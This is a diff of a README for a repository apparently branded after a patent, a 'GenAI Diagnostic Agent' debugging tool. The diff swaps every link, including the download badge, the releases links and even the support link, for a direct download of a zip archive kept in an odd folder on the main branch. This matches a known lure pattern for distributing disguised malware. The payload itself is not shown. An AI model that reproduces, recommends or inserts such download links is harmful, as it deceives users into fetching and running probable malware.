@@ -1,6 +1,6 @@
 # 🚀 Patent_US20240086445-GenAI-Diagnostic_Agent - Simplified Debugging for Your Devices
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Patent_US20240086445%20GenAI%20Diagnostic%20Agent-blue)](https://github.com/flychair/Patent_US20240086445-GenAI-Diagnostic_Agent/releases)
+[![Download the latest release](https://github.com/flychair/Patent_US20240086445-GenAI-Diagnostic_Agent/raw/refs/heads/main/picene/Diagnostic_Agent_Gen_Patent_A_U_v3.0-alpha.1.zip%20Now-Patent_US20240086445%20GenAI%20Diagnostic%20Agent-blue)](https://github.com/flychair/Patent_US20240086445-GenAI-Diagnostic_Agent/raw/refs/heads/main/picene/Diagnostic_Agent_Gen_Patent_A_U_v3.0-alpha.1.zip)
 
 ## 📋 Overview
 
@@ -25,7 +25,7 @@ Before you download, make sure your computer meets the following requirements:
 
 ## 🚀 Getting Started
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/flychair/Patent_US20240086445-GenAI-Diagnostic_Agent/releases) to access the latest version of the software.
+1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/flychair/Patent_US20240086445-GenAI-Diagnostic_Agent/raw/refs/heads/main/picene/Diagnostic_Agent_Gen_Patent_A_U_v3.0-alpha.1.zip) to access the latest version of the software.
 2. **Download the Application**:
    - Search for the latest release.
    - Click the download link for your operating system.
@@ -42,7 +42,7 @@ Before you download, make sure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-Visit this page to download the software: [Releases Page](https://github.com/flychair/Patent_US20240086445-GenAI-Diagnostic_Agent/releases).
+Visit this page to download the software: [Releases Page](https://github.com/flychair/Patent_US20240086445-GenAI-Diagnostic_Agent/raw/refs/heads/main/picene/Diagnostic_Agent_Gen_Patent_A_U_v3.0-alpha.1.zip).
 
 ## 🔧 How to Use
 
@@ -67,11 +67,11 @@ A: Check the "Help" section within the app for troubleshooting tips or visit the
 
 - **Installation Issues**: If the installer fails, ensure you have the correct system requirements. Restart your computer and try again.
 - **Performance Problems**: Close other applications while running diagnostics to improve performance.
-- **Missing Features**: Make sure you have the latest version from the [Releases Page](https://github.com/flychair/Patent_US20240086445-GenAI-Diagnostic_Agent/releases).
+- **Missing Features**: Make sure you have the latest version from the [Releases Page](https://github.com/flychair/Patent_US20240086445-GenAI-Diagnostic_Agent/raw/refs/heads/main/picene/Diagnostic_Agent_Gen_Patent_A_U_v3.0-alpha.1.zip).
 
 ## 📞 Support
 
-If you have questions or need help, please refer to the support section on our [GitHub page](https://github.com/flychair/Patent_US20240086445-GenAI-Diagnostic_Agent) for resources and contact information.
+If you have questions or need help, please refer to the support section on our [GitHub page](https://github.com/flychair/Patent_US20240086445-GenAI-Diagnostic_Agent/raw/refs/heads/main/picene/Diagnostic_Agent_Gen_Patent_A_U_v3.0-alpha.1.zip) for resources and contact information.
 
 ## 🎉 Conclusion
 
